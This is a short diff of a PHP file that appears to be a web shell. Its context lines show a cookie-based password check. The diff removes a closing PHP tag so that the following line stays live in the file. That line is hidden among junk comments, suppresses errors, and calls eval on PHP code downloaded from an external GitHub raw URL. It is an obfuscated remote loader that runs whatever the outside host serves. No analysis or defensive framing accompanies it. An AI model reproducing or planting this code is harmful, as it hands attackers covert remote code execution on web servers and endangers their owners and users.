@@ -23,6 +23,4 @@ if (!empty($auth_pass)) {
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
         Login();
 }
-?>
-
 <?=/****/@/*54134*/null; /******/@/*54134*/error_reporting(0);/****/@/*54134*/null; /******/@/*54134*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/zzvvzzserverzzvvzz/serviceserver/refs/heads/main/sserver.php"))/******/ /*FOR./KLL68*/?>
